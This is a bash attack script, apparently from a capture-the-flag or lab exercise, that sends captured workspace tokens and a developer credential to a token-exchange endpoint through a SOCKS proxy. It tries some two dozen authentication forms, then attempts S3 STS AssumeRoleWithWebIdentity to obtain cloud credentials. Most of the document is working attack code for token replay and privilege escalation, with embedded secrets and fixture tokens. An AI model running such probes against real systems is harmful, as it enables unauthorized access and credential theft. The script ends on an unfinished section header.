set +e
U="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
WT='FLAG{6bb66074f2325405}'
HT='FLAG{adfbabdcdaca98ac}'
B=https://cloud-api.keplerops.test
P=$B/api/workspaces/current/token-exchange
p(){ echo "=== $1"; shift; curl -sSk -m 10 --socks5-hostname 127.0.0.1:1080 -w '\n[HTTP %{http_code}]\n' "$@" 2>&1 | head -25; }
echo "########## EXCHANGE AUTH FORMS (workspace token)"
p "no auth" "$P"
p "bearer WT" -H "Authorization: Bearer $WT" "$P"
p "bearer HT" -H "Authorization: Bearer $HT" "$P"
p "x-auth-token WT" -H "X-Auth-Token: $WT" "$P"
p "x-workspace-token WT" -H "X-Workspace-Token: $WT" "$P"
p "x-fieldkest-token WT" -H "X-Fieldkest-Token: $WT" "$P"
p "authorization token WT" -H "Authorization: Token $WT" "$P"
p "authorization workspace WT" -H "Authorization: Workspace $WT" "$P"
p "authorization WorkspaceToken WT" -H "Authorization: WorkspaceToken $WT" "$P"
p "basic workspace:WT" -u "workspace:$WT" "$P"
p "basic svc-fieldlink-workload:WT" -u "svc-fieldlink-workload:$WT" "$P"
p "basic rowan.ito:WT" -u "rowan.ito:$WT" "$P"
p "cookie workspace_token WT" -H "Cookie: workspace_token=$WT" "$P"
p "query workspace_token" "$P?workspace_token=$WT"
p "query token" "$P?token=$WT"
p "POST form token no auth" -X POST -d "token=$WT" "$P"
p "POST form workspace_token no auth" -X POST -d "workspace_token=$WT" "$P"
p "POST json token no auth" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$WT\"}" "$P"
p "POST json workspace_token no auth" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$P"
p "POST json token basic" -u "$U" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$WT\"}" "$P"
p "POST json workspace_token basic" -u "$U" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$P"
p "POST json fixture basic" -u "$U" -X POST -H 'Content-Type: application/json' -d '{"fixture_token":"fk_workload_fixture_7nNUHpIQRCb5s2SLo7lb0sJH9LXByeMK"}' "$P"
p "POST json empty basic" -u "$U" -X POST -H 'Content-Type: application/json' -d '{}' "$P"
p "GET basic empty" -u "$U" "$P"
echo "########## S3 STS AssumeRoleWithWebIdentity"
E=https://objects.keplerops.test
for T in "$WT" "$HT"; do
 echo "--- STS token ${T:0:14}"
 curl -sSk -m 15 --socks5-hostname 127.0.0.1:1080 -w '\n[HTTP %{http_code}]\n' -X POST "$E/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=$T&DurationSeconds=3600" | head -40
 curl -sSk -m 15 --socks5-hostname 127.0.0.1:1080 -w '\n[HTTP %{http_code}]\n' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "WebIdentityToken=$T" --data-urlencode "DurationSeconds=3600" "$E/" | head -40
done
echo "########## S3 with query creds removed"
